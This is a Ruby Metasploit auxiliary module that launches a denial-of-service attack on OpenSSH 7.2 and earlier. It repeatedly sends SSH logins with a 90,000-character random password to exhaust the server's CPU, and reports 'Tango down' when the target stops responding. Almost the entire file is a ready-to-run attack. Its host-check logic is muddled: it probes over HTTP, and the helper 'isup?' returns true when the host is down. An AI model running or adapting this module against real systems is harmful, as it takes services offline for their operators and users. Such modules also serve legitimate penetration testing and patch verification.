##
# This module requires Metasploit: http://metasploit.com/download Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Socket::Constants
  def initialize(info = {})
    super(update_info(info,
      'Name' => 'OpenSSH Pre-7.3 Crypt CPU Consumption Denial of Service',
      'Description' => %q{
        This module exploits a password length bug in OpenSSH 7.2
        and earlier. The module sends a SSH connection request with
        the username as 'root' (unless specified otherwise) and a random 90000 character password.
        Because the password is so long, it exhausts the CPU, causing the service
        to crash.
      },
      'Author' =>
        [
          'Carter Brainerd <@thecarterb>',
          'Kashinath T'
        ],
      'License' => MSF_LICENSE
    ))
    register_options(
    [
      Opt::RPORT(22),
      OptInt.new('REQUESTS', [true, 'Number of requests to make', 3]),
      OptBool.new('CHECK_UP', [true, 'Check if the host is up after each request', true]),
      OptBool.new('RANDOM_UNAME', [false, 'Use a random username', false])
    ], self.class)
  end
  # Small function to check if the host is up
  def isup?
    begin
      res = send_request_cgi({ 'uri' => '/' })
      if !res.body.nil?
        return false
      end
    rescue
      return true
    end
  end
  def check_host_up
    print_status("Checking if #{rhost} is up.")
    is_target_up = isup?
    if is_target_up
      print_good("Tango down - #{rhost} is down!")
      return false
    else
      print_error("DoS failed, #{rhost} is still up")
      return true
    end
  end
  
  def run
    uname = nil
    if datastore['RANDOM_UNAME']
      uname = Rex::Text.rand_text_alpha(16)
    else
      uname = 'root'
    end
    vprint_status("Using username: #{uname}")
    amt = datastore['REQUESTS']
    pwd = Rex::Text.rand_text_alpha(90000) # Generate super long password
    print_status "Sending #{amt} requests to #{rhost}:#{rport}"
    amt.times do |iter|
      begin
        vprint_status("Sending request #{iter+1}")
        sess = Net::SSH.start( rhost, uname, :password => pwd ) # TODO: Have this prevent keyboard-interactive password input
        sess.close
      rescue Net::SSH::Disconnect => d # This should always occur
        vprint_error("#{rhost}:#{rport} - #{d.class}: #{d.message} ( This means it's working )")
        hostup = check_host_up
        return if !hostup
        next # Only get here if host isn't up
      rescue Net::SSH::Exception => e # This means something actually went wrong
        print_error("#{rhost}:#{rport} - #{e.class}: #{e.message}")
        if datastore['CHECK_UP']
          return if !check_host_up
        end
        next # Continue anyway
      end
    check_host_up if !datastore['CHECK_UP']
  end
end
end
